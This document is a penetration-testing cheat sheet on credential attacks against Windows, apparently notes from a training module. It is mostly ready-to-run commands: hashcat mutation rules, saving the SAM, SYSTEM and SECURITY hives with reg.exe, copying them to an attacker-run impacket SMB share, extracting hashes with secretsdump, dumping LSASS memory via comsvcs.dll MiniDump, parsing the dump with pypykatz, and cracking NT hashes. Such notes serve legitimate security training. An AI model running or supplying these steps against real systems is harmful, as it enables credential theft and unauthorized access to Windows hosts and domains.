#  Password Mutations
## Enumeration
 * [pypykatz](https://github.com/skelsec/pypykatz) - Mimikatz implementation in pure Python.

### Hashcat Rule File

```
cat password.list
password

Function Description
: 	Do nothing.
l 	Lowercase all letters.
u 	Uppercase all letters.
c 	Capitalize the first letter and lowercase others.
sXY 	Replace all instances of X with Y.
$! 	Add the exclamation character at the end.

cat custom.rule

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```

### Generating Rule-based Wordlist
```
hashcat --force $input -r custom.rule --stdout | sort -u > $output
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list # example

cat mut_password.list

password
Password
passw0rd
Passw0rd
p@ssword
P@ssword
P@ssw0rd
password!
Password!
passw0rd!
p@ssword!
Passw0rd!
P@ssword!
p@ssw0rd!
P@ssw0rd!
```

### Hashcat Existing Rules
```
ls /usr/share/hashcat/rules/
```
### [Default Credentials CheatSheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)
### Attacking SAM

**hklm\sam**	Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.
**hklm\system** 	Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.
**hklm\security** 	Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.

```
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
```

### Creating a Share with smbserver.py

```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData $some_folder
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData $HOME/ # Example
```

Once we have the share running on our attack host, we can use the move command on the Windows target to move the hive copies to the share.
```
move sam.save \\$lhost\CompData
move security.save \\$lhost\CompData
move system.save \\$lhost\CompData
# lhost is the smbserver we created
```

### Locating secretsdump.py

```
locate secretsdump
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam $HOME/sam.save -security $HOME/security.save -system $HOME/system.save LOCAL
```

## Attacking LSASS 
### Dumping LSASS Process Memory
```
Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file
```

A file called lsass.DMP is created and saved in:

```
C:\Users\loggedonusersdirectory\AppData\Local\Temp
```

### Rundll32.exe & Comsvcs.dll Method

Before issuing the command to create the dump file, we must determine what process ID (PID) is assigned to lsass.exe. This can be done from cmd or PowerShell:

### Finding LSASS PID in cmd
From cmd, we can issue the command tasklist /svc and find lsass.exe and its process ID in the PID field.
```
tasklist /svc
```
### Finding LSASS PID in PowerShell

From PowerShell, we can issue the command Get-Process lsass and see the process ID in the Id field.
```
Get-Process lsass
```

### Creating lsass.dmp using PowerShell
With an elevated PowerShell session, we can issue the following command to create the dump file:
```
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

With this command, we are running rundll32.exe to call an exported function of comsvcs.dll which also calls the MiniDumpWriteDump (MiniDump) function to dump the LSASS process memory to a specified directory (C:\lsass.dmp). Recall that most modern AV tools recognize this as malicious and prevent the command from executing. In these cases, we will need to consider ways to bypass or disable the AV tool we are facing. AV bypassing techniques are outside of the scope of this module.

If we manage to run this command and generate the lsass.dmp file, we can proceed to transfer the file onto our attack box to attempt to extract any credentials that may have been stored in LSASS process memory.


### Running Pypykatz
```
 pypykatz lsa minidump $HOME/lsass.dmp 
```
## Cracking the NT Hash with Hashcat

```
sudo hashcat -m 1000 $hash $wordlist
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt # Example
```

